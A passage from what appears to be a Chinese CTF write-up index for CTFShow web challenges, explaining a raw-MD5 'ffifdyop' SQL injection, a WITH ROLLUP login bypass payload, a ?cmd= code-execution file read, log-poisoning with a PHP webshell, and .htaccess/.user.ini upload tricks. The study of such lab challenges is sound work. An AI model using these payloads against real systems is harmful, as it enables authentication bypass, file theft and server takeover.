ffifdyop\nhex: 276f722736c95d99e921722cf9ed621c\nraw: 'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c\nstring: 'or'6]!r,b\n</code></pre> <p>\u200b       \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f53 <code>raw</code> \u9879\u4e3a <code>true</code> \u65f6\uff0c\u8fd4\u56de\u7684\u8fd9\u4e2a\u539f\u59cb\u4e8c\u8fdb\u5236\u4e0d\u662f\u666e\u901a\u7684\u4e8c\u8fdb\u5236<code>(0,1)</code>\uff0c\u800c\u662f<code>'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c</code>\u8fd9\u79cd\u3002</p> <p>\u200b       \u4e0a\u9762\u7684<code>ffifdyop</code>\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684 16 \u4f4d\u539f\u59cb\u4e8c\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u5c31\u662f\u201d<code>'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c</code>\u3002\u201c<code>\\</code>\u201d\u540e\u9762\u7684 3 \u4e2a\u5b57\u7b26\u8fde\u540c\u201c<code>\\</code>\u201d\u7b97\u4e00\u4e2a\u5b57\u7b26\uff0c\u6bd4\u5982\u201c<code>\\xc9</code>\u201d\uff0c\u6240\u4ee5\u4e0a\u8ff0\u4e00\u5171 16 \u4e2a\u3002\u5f53\u7136\uff0c\u50cf<code>\\xc9</code>\u8fd9\u79cd\u5b57\u7b26\u4f1a\u663e\u793a\u4e71\u7801\u3002</p> <p>\u200b       \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u7528\u2019ffifdyop\u2018\u5e26\u5165\uff0c\u770b\u4e00\u4e0b\u5b9e\u9645\u7684\u6548\u679c\u3002</p> <p></p> <p>\u200b       \u8fd9\u91cc 32 \u4f4d\u7684 16 \u8fdb\u5236\u7684\u5b57\u7b26\u4e32\uff0c\u4e24\u4e2a\u4e00\u7ec4\u5c31\u662f\u4e0a\u9762\u7684 16 \u4f4d\u4e8c\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u3002\u6bd4\u5982 27\uff0c\u8fd9\u662f 16 \u8fdb\u5236\u7684\uff0c\u5148\u8981\u8f6c\u5316\u4e3a 10 \u8fdb\u5236\u7684\uff0c\u5c31\u662f 39\uff0c39 \u5728 ASC \u7801\u8868\u91cc\u9762\u5c31\u662f<code>'</code>\u5b57\u7b26\u30026f \u5c31\u662f\u5bf9\u5e94<code>o</code>\u3002</p> <p>\u200b       \u7136\u540e\u6211\u4eec\u5f97\u5230\u7684 sql \u8bed\u53e5\u5c31\u662f\u00a0SELECT * FROM admin WHERE username = 'admin' and password = ''or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb'</p> <p>\u200b       \u4e3a\u4ec0\u4e48 password = ''or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb'\u7684\u8fd4\u56de\u503c\u4f1a\u662f true \u5462\uff0c\u56e0\u4e3a or \u540e\u9762\u7684\u5355\u5f15\u53f7\u91cc\u9762\u7684\u5b57\u7b26\u4e32\uff086\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb\uff09\uff0c\u662f\u6570\u5b57\u5f00\u5934\u7684\u3002\u5f53\u7136\u4e0d\u80fd\u4ee5 0 \u5f00\u5934\u3002\uff08\u6211\u4e0d\u77e5\u9053\u5728\u6570\u636e\u5e93\u91cc\u9762\u67e5\u8be2\u7684\u65f6\u5019\uff0c\ufffd\u8fd9\u79cd\u4f1a\u4e0d\u4f1a\u663e\u793a\uff09</p> <p>\u200b       \u8fd9\u91cc\u5f15\u7528\u4e00\u7bc7\u6587\u7ae0\uff0c\u91cc\u9762\u7684\u539f\u8bdd \u201ca string starting with a\u00a0<code>1</code>\u00a0is cast as an integer when used as a boolean.\u201c</p> <p>\u200b       \u5728 mysql \u91cc\u9762\uff0c\u5728\u7528\u4f5c\u5e03\u5c14\u578b\u5224\u65ad\u65f6\uff0c\u4ee5 1 \u5f00\u5934\u7684\u5b57\u7b26\u4e32\u4f1a\u88ab\u5f53\u505a\u6574\u578b\u6570\u3002\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u79cd\u60c5\u51b5\u662f\u5fc5\u987b\u8981\u6709\u5355\u5f15\u53f7\u62ec\u8d77\u6765\u7684\uff0c\u6bd4\u5982 password=\u2018xxx\u2019 or \u20181xxxxxxxxx\u2019\uff0c\u90a3\u4e48\u5c31\u76f8\u5f53\u4e8e password=\u2018xxx\u2019 or 1\u00a0 \uff0c\u4e5f\u5c31\u76f8\u5f53\u4e8e password=\u2018xxx\u2019 or true\uff0c\u6240\u4ee5\u8fd4\u56de\u503c\u5c31\u662f true\u3002\u5f53\u7136\u5728\u6211\u540e\u6765\u6d4b\u8bd5\u4e2d\u53d1\u73b0\uff0c\u4e0d\u53ea\u662f 1 \u5f00\u5934\uff0c\u53ea\u8981\u662f\u6570\u5b57\u5f00\u5934\u90fd\u662f\u53ef\u4ee5\u7684\u3002**</p> <p>\u200b       \u5f53\u7136\u5982\u679c\u53ea\u6709\u6570\u5b57\u7684\u8bdd\uff0c\u5c31\u4e0d\u9700\u8981\u5355\u5f15\u53f7\uff0c\u6bd4\u5982 password=\u2018xxx\u2019 or 1\uff0c\u90a3\u4e48\u8fd4\u56de\u503c\u4e5f\u662f true\u3002\uff08xxx \u6307\u4ee3\u4efb\u610f\u5b57\u7b26\uff09</p> <p>\u200b       \u6240\u4ee5\u5230\u8fd9\u91cc\u4e3a\u6b62\uff0c\u5c31\u5b8c\u6210\u4e86 sql \u6ce8\u5165\u3002\u540c\u65f6\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u79cd sql \u8bed\u53e5\uff0c\u5728 mysql \u91cc\u9762\u662f\u53ef\u4ee5\u884c\u5f97\u901a\u7684\uff0c\u4f46\u662f\u5728 oracle \u6570\u636e\u5e93\u91cc\u9762\u8fd9\u6837\u7684\u8bed\u53e5\u662f\u6709\u8bed\u6cd5\u9519\u8bef\u7684\u3002</p> <p>\u200b       \u6240\u4ee5\u56de\u8fc7\u5934\u6765\u4e3a\u4ec0\u4e48 ffifdyop \u5c31\u662f\u7b54\u6848\uff0c\u56e0\u4e3a ffifdyop \u7684 md5 \u7684\u539f\u59cb\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u91cc\u9762\u6709\u2018or\u20196 \u8fd9\u4e00\u90e8\u5206\u7684\u5b57\u7b26\u3002\u90a3\u4e48\u8fdb\u4e00\u6b65\u601d\u8003\u8fd9\u4e2a\u5355\u5f15\u53f7\u662f\u5426\u662f\u5fc5\u8981\u7684\uff0c\u8fd9\u4e24\u4e2a\u5355\u5f15\u53f7\u662f\u4e3a\u4e86\u4e0e\u539f\u6709\u7684\u8bed\u53e5\u7684\u5355\u5f15\u53f7\u914d\u5bf9\u3002\u6240\u4ee5\u6211\u4eec\u7406\u89e3\u4e86\u8fd9\u4e2a sql \u6ce8\u5165\u7684\u539f\u7406\uff0c\u90a3\u4e48\u5c31\u660e\u767d\u4e86\u6211\u4eec\u9700\u8981\u600e\u6837\u7684\u5b57\u7b26\u4e32\u3002</p> <p>\u200b       \u5f53\u7136\u7b54\u6848\u4e5f\u4e0d\u6b62\u8fd9\u4e00\u4e2a\u3002</p> Text Only<pre><code>content: 129581926211651571912466741651878684928\nhex: 06da5430449f8f6f23dfc1276f722738\nraw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1'or'8\nstring: T0Do#'or'8\n</code></pre> <p>\u200b       \u8fd9\u4e2a\u5b57\u7b26\u4e32\u4e5f\u662f\u7b26\u5408\u8981\u6c42\u7684\u3002\u56e0\u4e3a\u5b83\u542b\u6709\u2018or\u20198</p> <p>\u200b       \u4e5f\u8bb8\u8fd8\u6709\u5176\u4ed6\u7b26\u5408\u8981\u6c42\u7684\u5b57\u7b26\u4e32\uff0c\u4e5f\u53ef\u4ee5\u81ea\u5df1\u5199\u4e2a\u4ee3\u7801\u53bb\u8ba1\u7b97\uff0c\u4f46\u662f\u8ba1\u7b97\u6b21\u6570\u4f1a\u5f88\u5927\uff0c\u4e0b\u9762\u90a3\u7bc7\u6587\u7ae0\u91cc\u7684\u4f5c\u8005\u5c31\u662f\u81ea\u5df1\u5199\u7684\u4ee3\u7801\u8ba1\u7b97\u7684\u3002</p> <p>\u200b       \u90a3\u6211\u4eec\u4ece\u6b63\u5411\u63a8\u7b97\u4e00\u4e0b\uff0c\u8981\u600e\u4e48\u5f97\u5230\u6211\u4eec\u8981\u7684\u7b54\u6848\u3002\u9996\u5148\u6211\u4eec\u8981\u627e\u5230\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7ecf\u8fc7 md5 \u5f97\u5230\u7684 16 \u4f4d\u539f\u59cb\u4e8c\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u80fd\u5e2e\u6211\u4eec\u5b9e\u73b0 sql \u6ce8\u5165\u3002\u9996\u5148 or \u8fd9\u4e2a\u5b57\u7b26\u4e32\u662f\u5fc5\u8981\u7684\uff0c\u540c\u65f6\u4e3a\u4e86\u914d\u5bf9\u539f\u5148 sql \u8bed\u53e5\u91cc\u9762\u6709\u7684\u5355\u5f15\u53f7</p> <p>\u200b       \u5728 or \u7684\u4e24\u8fb9\u8981\u6709\u5355\u5f15\u53f7\uff0c\u4f7f\u5b83\u53d8\u6210\u00a0 password=\u2018xxx\u2019or\u2018xxx\u2019\u00a0 \u7684\u5f62\u5f0f\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u7684\u5b57\u7b26\u4e32\u7684\u539f\u59cb\u4e8c\u8fdb\u5236\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\u91cc\u8981\u5305\u542b\u00a0 \u00a0 \u2018or\u2019\u00a0 \u00a0 \uff0c\u5982\u679c\u6839\u636e\u539f\u59cb\u4e8c\u8fdb\u5236\u6765\u627e\u5230\u6211\u4eec\u8981\u7684\u5b57\u7b26\u4e32\u53ef\u80fd\u4f1a\u6bd4\u8f83\u9ebb\u70e6\uff0c\u90a3\u4e48\u53ef\u4ee5\u6839\u636e 32 \u4f4d 16 \u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u6765\u67e5\u627e\uff0c\u6839\u636e\u4e0a\u9762\u4ecb\u7ecd\u7684\uff0c\u00a0 \u2018or\u2019\u00a0 \u00a0\u5bf9\u5e94\u7684 16 \u8fdb\u5236\u662f\u00a0 \u00a0276f7227\u00a0 \u00a0 \uff0c\u6240\u4ee5\u6211\u4eec\u7684\u76ee\u6807\u5c31\u662f\u8981\u627e\u4e00\u4e2a\u5b57\u7b26\u4e32\u53d6 32 \u4f4d 16 \u8fdb\u5236\u7684 md5 \u503c\u91cc\u5e26\u6709 276f7227 \u8fd9\u4e2a\u5b57\u6bb5\u7684\uff0c\u63a5\u7740\u5c31\u662f\u8981\u770b\u5173\u952e\u7684\u6570\u5b57\u90e8\u5206\u4e86\uff0c\u5728 276f7227 \u8fd9\u4e2a\u5b57\u6bb5\u540e\u9762\u7d27\u8ddf\u4e00\u4e2a\u6570\u5b57\uff0c\u9664\u4e86 0\uff0c1-9\uff0c\u5bf9\u5e94\u7684 asc \u7801\u503c\u662f 49-57\uff0c\u8f6c\u5316\u4e3a 16 \u8fdb\u5236\u5c31\u662f 31-39\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u9700\u8981\u6709 276f7227+\uff0831-39\uff09\u8fd9\u4e2a\u5b57\u6bb5\uff0c\u5c31\u53ef\u4ee5\u6ee1\u8db3\u8981\u6c42\u3002\u6bd4\u5982 xxxxxxxxxxxxxxxx276f7227\uff0831-39)xxxxxx</p>"},{"location":"WEB/CTFShow/CTFshow-web/#web10-with-rollup","title":"web10 (with rollup)","text":"<p>\u5f97\u5230\u6e90\u7801</p> PHP<pre><code>&lt;?php\n$flag = \"\";\nfunction replaceSpecialChar($strParam)\n{\n    $regex = \"/(select|from|where|join|sleep|and|\\s|union|,)/i\";\n    return preg_replace($regex, \"\", $strParam);\n}\nif (!$con) {\n    die('Could not connect: ' . mysqli_error());\n}\nif (strlen($username) != strlen(replaceSpecialChar($username))) {\n    die(\"sql inject error\");\n}\nif (strlen($password) != strlen(replaceSpecialChar($password))) {\n    die(\"sql inject error\");\n}\n$sql = \"select * from user where username = '$username'\";\n$result = mysqli_query($con, $sql);\nif (mysqli_num_rows($result) &gt; 0) {\n    while ($row = mysqli_fetch_assoc($result)) {\n        if ($password == $row['password']) {\n            echo \"\u767b\u9646\u6210\u529f&lt;br&gt;\";\n            echo $flag;\n        }\n    }\n}\n?&gt;\n</code></pre> <p>\u6ce8\u91ca\uff1a</p> <p>\u8be5PHP\u811a\u672c\u5305\u542b\u4e00\u4e2a\u51fd\u6570<code>replaceSpecialChar()</code>\u548c\u4e00\u7cfb\u5217\u7528\u4e8e\u6570\u636e\u5e93\u8fde\u63a5\u3001SQL\u67e5\u8be2\u4ee5\u53ca\u767b\u5f55\u9a8c\u8bc1\u7684\u903b\u8f91\u3002</p> <ol> <li><code>replaceSpecialChar($strParam)</code> \u51fd\u6570\uff1a</li> <li>\u529f\u80fd\uff1a\u6b64\u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570 <code>$strParam</code>\uff0c\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f <code>/regex/i</code> \u6765\u67e5\u627e\u5e76\u66ff\u6362\u5176\u4e2d\u53ef\u80fd\u88ab\u7528\u4e8eSQL\u6ce8\u5165\u653b\u51fb\u7684\u90e8\u5206\u3002\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u4ee5\u4e0b\u5b57\u7b26\u6216\u5173\u952e\u5b57\uff1a\"select\", \"from\", \"where\", \"join\", \"sleep\", \"and\", \u7a7a\u683c, \"union\" \u4ee5\u53ca\u9017\u53f7\uff08<code>,</code>\uff09\u3002</li> <li>\u8fd4\u56de\u503c\uff1a\u8fd4\u56de\u5904\u7406\u540e\u7684\u5b57\u7b26\u4e32\uff0c\u6240\u6709\u5339\u914d\u5230\u7684\u7279\u6b8a\u5b57\u7b26\u6216\u5173\u952e\u5b57\u90fd\u88ab\u79fb\u9664\u3002</li> <li>\u6570\u636e\u5e93\u8fde\u63a5\u90e8\u5206\uff1a</li> <li>\u5982\u679c\u65e0\u6cd5\u5efa\u7acb\u6570\u636e\u5e93\u8fde\u63a5\uff0c\u5219\u901a\u8fc7 <code>die('Could not connect: ' . mysqli_error());</code> \u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u5e76\u7ec8\u6b62\u811a\u672c\u6267\u884c\u3002</li> <li>SQL\u6ce8\u5165\u9632\u62a4\u68c0\u67e5\uff1a</li> <li>\u5bf9\u8f93\u5165\u7684\u7528\u6237\u540d <code>$username</code> \u548c\u5bc6\u7801 <code>$password</code> \u8c03\u7528 <code>replaceSpecialChar()</code> \u51fd\u6570\uff0c\u5e76\u6bd4\u8f83\u539f\u5b57\u7b26\u4e32\u957f\u5ea6\u4e0e\u5904\u7406\u540e\u5b57\u7b26\u4e32\u957f\u5ea6\u3002\u5982\u679c\u957f\u5ea6\u4e0d\u4e00\u81f4\uff0c\u8bf4\u660e\u5b58\u5728\u53ef\u80fd\u7684SQL\u6ce8\u5165\u653b\u51fb\uff0c\u6b64\u65f6\u8f93\u51fa \"sql inject error\" \u5e76\u7ec8\u6b62\u811a\u672c\u3002</li> <li>\u767b\u5f55\u9a8c\u8bc1\u6d41\u7a0b\uff1a</li> <li>\u6839\u636e\u7528\u6237\u540d\u6784\u5efaSQL\u67e5\u8be2\u8bed\u53e5\uff08\u672a\u5bf9\u8f93\u5165\u8fdb\u884c\u9884\u5904\u7406\u548c\u8f6c\u4e49\uff0c\u5b9e\u9645\u4e0a\u6b64\u5904\u4ecd\u6709SQL\u6ce8\u5165\u98ce\u9669\uff09\uff0c\u5c1d\u8bd5\u4ece <code>user</code> \u8868\u4e2d\u83b7\u53d6\u5bf9\u5e94\u8bb0\u5f55\u3002</li> <li>\u82e5\u67e5\u8be2\u7ed3\u679c\u4e2d\u5b58\u5728\u884c\u6570\u5927\u4e8e0\u7684\u8bb0\u5f55\uff0c\u5219\u5faa\u73af\u904d\u5386\u67e5\u8be2\u7ed3\u679c\uff0c\u6bd4\u5bf9\u5bc6\u7801\u5b57\u6bb5\u662f\u5426\u4e0e\u7528\u6237\u8f93\u5165\u7684\u5bc6\u7801\u76f8\u5339\u914d\u3002</li> <li>\u5f53\u627e\u5230\u5339\u914d\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u65f6\uff0c\u8f93\u51fa\"\u767b\u9646\u6210\u529f\"\uff0c\u540c\u65f6\u663e\u793a\u53d8\u91cf <code>$flag</code> \u7684\u5185\u5bb9\uff08\u8fd9\u91cc <code>$flag</code> \u662f\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\uff0c\u4f46\u5176\u5b9e\u9645\u7528\u9014\u53d6\u51b3\u4e8e\u4e0a\u4e0b\u6587\u73af\u5883\uff09\u3002</li> </ol> <p><code>$regex = \"/(select|from|where|join|sleep|and|\\s|union|,)/i\";</code> \u4ece\u6e90\u7801\u4e2d\u53ef\u4ee5\u5f97\u77e5\u51e0\u4e4e\u628a\u6ce8\u5165\u7528\u5230\u7684\u5173\u952e\u8bcd\u8fc7\u6ee4\u7684\u5dee\u4e0d\u591a\u4e86\u3002 \u5982\u679c\u53ea\u6709\u4e0a\u9762\u8fd9\u4e00\u6761\u73b0\u5728\u53ef\u4ee5\u91c7\u7528\u53cc\u5199\u7ed5\u8fc7\uff0c\u4f46\u662f\u52a0\u4e0a\u4e0b\u9762\u8fd9\u70b9\uff0c\u4f7f\u5f97\u65e0\u6cd5\u53cc\u5199\u7ed5\u8fc7</p> PHP<pre><code>if(strlen($username)!=strlen(replaceSpecialChar($username))){\n  die(\"sql inject error\");\n}\n</code></pre> <p>\u4ecb\u7ecd\u4e00\u4e0b\u4e24\u4e2asql\u8bed\u53e5\uff1a</p> <ol> <li> <p>group by\uff1a\u5bf9\u8fdb\u884c\u67e5\u8be2\u7684\u7ed3\u679c\u8fdb\u884c\u5206\u7ec4\u3002group by\u540e\u8ddf\u4ec0\u4e48\uff0c\u5c31\u6309\u4ec0\u4e48\u5206\u7ec4</p> </li> <li> <p>with rollup\uff1agroup by \u540e\u53ef\u4ee5\u8ddfwith rollup\uff0c\u8868\u793a\u5728\u8fdb\u884c\u5206\u7ec4\u7edf\u8ba1\u7684\u57fa\u7840\u4e0a\u518d\u6b21\u8fdb\u884c\u6c47\u603b\u7edf\u8ba1\u3002</p> </li> </ol> <p>\u770b\u770b\u793a\u4f8b\u56fe\u7247\uff08\u7ed3\u679c\u4e2d\u5c06\u4f1a\u591a\u51fa\u4e00\u884c\uff0c\u5176\u4e2dpassword\u5217\u4e3anull\uff0ccount\uff08*\uff09\u4e3a\u7edf\u8ba1\u548c\u3002\uff09</p> <p></p> <p>\u8fc7\u6ee4\u7a7a\u683c\u7684\u8bdd\u7528/**/\u8fdb\u884c\u7ed5\u8fc7\u5c31\u884c</p> <p>pyload: <code>admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup/**/#</code></p> PHP<pre><code>\u6267\u884c\u7684\u5b8c\u6574\u8bed\u53e5\u4e3a\n$sql = \"select * from user where username = 'admin' or 1=1 group by password with rollup #'\"\n</code></pre> <p>\u5728\u7528\u6237\u540d\u6846\u91cc\u8f93\u5165\u8fd9\u4e2a\uff0c\u5bc6\u7801\u6846\u91cc\u4e3a\u7a7a\u5373\u53ef\u3002\u56e0\u4e3a\u52a0\u5165with rollup\u540e password\u6709\u4e00\u884c\u4e3aNULL\uff0c\u6211\u4eec\u53ea\u8981\u8f93\u5165\u7a7a\u5bc6\u7801\u4f7f\u5f97\uff08<code>NULL==NULL</code>\uff09\u5373\u53ef\u6ee1\u8db3<code>$password==$row['password']</code></p> <p>\u8fd9\u6837\u5c31\u80fd\u767b\u5f55\u6210\u529f\u4e86\u3002\u5373\u53ef\u83b7\u5f97flag</p>"},{"location":"WEB/CTFShow/CTFshow-web/#web12","title":"web12 \u5229\u7528\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u8bfb\u53d6\u654f\u611f\u6587\u4ef6\uff08\u5f85\u89e3\u51b3\uff09","text":"<p>\u770b\u5230cmd\uff0c\u5c1d\u8bd5<code>/?cmd=phpinfo();</code></p> <p>\u51fa\u73b0\u56de\u663e\uff0c\u8bf4\u660e\u5b58\u5728\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u91c7\u7528glob\u901a\u914d\u7b26\u547d\u4ee4\u5f97\u5230\u6587\u4ef6\u540d</p> <p>php\u7684\u51fd\u6570<code>glob()</code>; glob() \u51fd\u6570\u8fd4\u56de\u5339\u914d\u6307\u5b9a\u6a21\u5f0f\u7684\u6587\u4ef6\u540d\u6216\u76ee\u5f55\u3002 \u8be5\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u6709\u5339\u914d\u6587\u4ef6/\u76ee\u5f55\u7684\u6570\u7ec4\u3002\u5982\u679c\u5931\u8d25\u5219\u8fd4\u56de FALSE\u3002</p> <p>\u4e3e\u4e2a\u4f8b\u5b50:  <code>glob(\"*\")</code>\u5339\u914d\u4efb\u610f\u6587\u4ef6  <code>glob(\"*.txt\")</code>\u5339\u914d\u4ee5txt\u4e3a\u540e\u7f00\u7684\u6587\u4ef6</p> <p>\u6709\u4e86\u8fd9\u4e2a\u65b9\u6cd5\u6211\u4eec\u5148\u628a\u5f53\u524d\u76ee\u5f55\u4e0b\u6240\u6709\u7684\u6587\u4ef6\u627e\u51fa\u6765\u770b\u770b\u6709\u6ca1\u6709\u53ef\u7528\u7684\u3002  \u8f93\u5165<code>?cmd=print_r(glob(\"*\"));</code></p> <p>print_r() \u51fd\u6570\u7528\u4e8e\u6253\u5370\u53d8\u91cf\uff0c\u4ee5\u66f4\u5bb9\u6613\u7406\u89e3\u7684\u5f62\u5f0f\u5c55\u793a\u3002</p> <p>\u6700\u540e/?cmd=highlight_file('903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php');</p> <p><code>hightlight_file()</code>\u53ef\u4ee5\u4f7f\u6587\u4ef6\u5185\u5bb9\u9ad8\u4eae\u663e\u793a, \u5e38\u7528\u4e8e\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9</p> <p>\u5173\u4e8ephp\u4e2decho()\uff0cprint()\uff0cprint_r()\u7684\u533a\u522b</p> <p>echo\uff0cprint\u7684\u533a\u522b\u5728\u4e8e echo \u53ef\u4ee5\u8f93\u51fa\u591a\u4e2a\u53d8\u91cf\u503c\uff0c\u800c print \u53ea\u6709\u4e00\u4e2a\u53d8\u91cf\uff0c\u505a\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\u8f93\u51fa\u3002\u53e6\u4e00\u70b9\u533a\u522b\u5728\u4e8e echo \u6ca1\u6709\u8fd4\u56de\u503c\uff0cprint \u6709\u8fd4\u56de\u503c\u3002</p> <p>print \u4e0d\u80fd\u8f93\u51fa\u6570\u7ec4\u548c\u5bf9\u8c61\u3002print_r \u53ef\u4ee5\u8f93\u51fa stirng\u3001int\u3001float\u3001array\u3001object \u7b49\uff0c\u8f93\u51fa array \u65f6\u4f1a\u7528\u7ed3\u6784\u8868\u793a\uff0cprint_r \u8f93\u51fa\u6210\u529f\u65f6\u8fd4\u56de true\uff1b\u800c\u4e14 print_r \u53ef\u4ee5\u901a\u8fc7 print_r($str,true) \u6765\u4f7f print_r \u4e0d\u8f93\u51fa\u800c\u8fd4\u56de print_r \u5904\u7406\u540e\u7684\u503c\u3002</p> <p>print \u662f\u6253\u5370\u5b57\u7b26\u4e32\u3002print_r \u5219\u662f\u6253\u5370\u590d\u5408\u7c7b\u578b\uff0c\u5982\u6570\u3001\u5bf9\u8c61\u7b49\u3002</p> <p>\u5728 PHP \u4e2d\u7684\u6267\u884c\u901f\u7387\u4ece\u5feb\u5230\u6162\u4e3a\uff1aecho()\u3001print()\u3001print_r()</p> <p>echo \u662f PHP \u8bed\u53e5\uff0cprint \u548c print_r \u662f\u51fd\u6570\uff0c\u8bed\u53e5\u6ca1\u6709\u8fd4\u56de\u503c\uff0c\u51fd\u6570\u53ef\u4ee5\u6709\u8fd4\u56de\u503c(\u5373\u4fbf\u6ca1\u6709\u7528)</p> <p>echo()\uff1a\u53ef\u4ee5\u540c\u65f6\u8f93\u51fa\u591a\u4e2a\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u591a\u4e2a\u53c2\u6570\uff0c\u5e76\u4e0d\u9700\u8981\u5706\u62ec\u53f7\uff0c\u65e0\u8fd4\u56de\u503c\u3002</p> <p>print()\uff1a\u53ea\u53ef\u4ee5\u540c\u65f6\u8f93\u51fa\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4e00\u4e2a\u53c2\u6570\uff0c\u9700\u8981\u5706\u62ec\u53f7\uff0c\u6709\u8fd4\u56de\u503c\uff0c\u5f53\u5176\u6267\u884c\u5931\u8d25\u65f6\u8fd4 flase\u3002print  \u7684\u7528\u6cd5\u548cC\u8bed\u8a00\u5f88\u50cf\uff0c\u6240\u4ee5\u4f1a\u5bf9\u8f93\u51fa\u5185\u5bb9\u91cc\u7684%\u505a\u7279\u6b8a\u89e3\u91ca</p> <p>print_r()\uff1a\u529f\u80fd\uff1a\u53ea\u7528\u4e8e\u8f93\u51fa\u6570\u7ec4\u3002</p> <p>\u7591\u95ee\uff1a</p> <p>\u5b98\u65b9\u7684WP\u4e2d\u6709\u7684\u4e0d\u662f\u8fd9\u6837\u505a\u7684\uff0c\u5982\u4e0b\uff1a</p> <p>nginx\u65e5\u5fd7\u5199shell\uff0c\u7136\u540e\u8681\u5251\u8fde\u63a5\u5229\u7528\u63d2\u4ef6\u7ed5\u8fc7disable_function</p> <p>1\u3001?cmd=include(\"/var/log/nginx/access.log\"); \u62e6\u622a\u5305\uff0c\u5728UA\u5934\u5185\u52a0\u5165php\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <p>2\u3001\u8681\u5251\u8fde\u63a5\uff0c\u53d1\u73b0\u65e0\u64cd\u4f5c\u6743\u9650\uff0c\u4f7f\u7528\u63d2\u4ef6\u7ed5\u8fc7disable_function\uff0c\u6210\u529f\u67e5\u770bflag</p> <p>\u95ee\u9898\u5728\u4e8e\u6211\u4e0d\u4f1a\u4f7f\u7528 disable_function \u63d2\u4ef6</p>"},{"location":"WEB/CTFShow/CTFshow-web/#web13-htaccess-userini","title":"web13  (.htaccess) (.user.ini)","text":"<p>==.htaccess==</p> Text Only<pre><code>&lt;FilesMatch \"a.txt\"&gt;\nSetHandler application/x-httpd-php\n&lt;/FilsMatch&gt;\n</code></pre> <p>==.user.ini==</p> Text Only<pre><code>auto_append_file=a.txt\n</code></pre> <p>.htaccess\u662f\u4f2a\u9759\u6001\u73af\u5883\u914d\u7f6e\u6587\u4ef6\uff0c\u7528\u4e8elamp\u3002  .user.ini\u662flnmp\u6587\u4ef6\uff0c\u91cc\u9762\u653e\u7684\u662f\u4f60\u7f51\u7ad9\u7684\u6587\u4ef6\u5939\u8def\u5f84\u5730\u5740\u3002\u76ee\u7684\u662f\u9632\u6b62\u8de8\u76ee\u5f55\u8bbf\u95ee\u548c\u6587\u4ef6\u8de8\u76ee\u5f55\u8bfb\u53d6.  \u914d\u7f6e \u653e\u5728\u6839\u76ee\u5f55 .user.ini </p> <p>\u4e24\u4e2aPHP\u65b9\u6cd5\uff1a</p> <p>auto_prepend_file:\u5728\u9875\u9762\u9876\u90e8\u52a0\u8f7d\u6587\u4ef6</p> <p>auto_append_file:\u5728\u9875\u9762\u5e95\u90e8\u52a0\u8f7d\u6587\u4ef6</p> <p>\u4e0a\u4f20\u4e4b\u540e\uff0c\u4efb\u4f55\u4e00\u4e2aPHP\u6587\u4ef6\u90fd\u53ef\u4ee5\u4f7f\u7528\u8681\u5251\u7b49\u5de5\u5177\u8fde\u63a5</p>"},{"location":"WEB/CTFShow/CTFshow-web/#web14-apache","title":"web14 Apache\u4e3b\u8981\u914d\u7f6e\u6587\u4ef6","text":"<p>Apache \u4e3b\u8981\u914d\u7f6e\u6587\u4ef6\u6ce8\u91ca Apache\u7684\u4e3b\u914d\u7f6e\u6587\u4ef6\uff1a/etc/httpd/conf/httpd.conf \u9ed8\u8ba4\u7ad9\u70b9\u4e3b\u76ee\u5f55\uff1a/var/www/html/ Apache\u670d\u52a1\u5668\u7684\u914d\u7f6e\u4fe1\u606f\u5168\u90e8\u5b58\u50a8\u5728\u4e3b\u914d\u7f6e\u6587\u4ef6/etc/httpd/conf/httpd.conf\u4e2d\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\u975e\u5e38\u591a\uff0c\u7528wc\u547d\u4ee4\u7edf\u8ba1\u4e00\u5171\u67091009\u884c\uff0c\u5176\u4e2d\u5927\u90e8\u5206\u662f\u4ee5#\u5f00\u5934\u7684\u6ce8\u91ca\u884c\u3002</p> <p><code>union select load_file('/var/www/html/index.php')</code></p>"},{"location":"WEB/labs/CTFHub%E6%8A%80%E8%83%BD%E6%A0%91%E7%AC%94%E8%AE%B0/","title":"CTFHub\u6280\u80fd\u6811\u7b14\u8bb0","text":""},{"location":"WEB/labs/CTFHub%E6%8A%80%E8%83%BD%E6%A0%91%E7%AC%94%E8%AE%B0/#_1","title":"\u7f16\u7801","text":"Text Only<pre><code>1:0x9\u5b57\u7b26\u662f \u6c34\u5e73\u5b9a\u4f4d\u7b26\n2:0xa\u5b57\u7b26\u662f 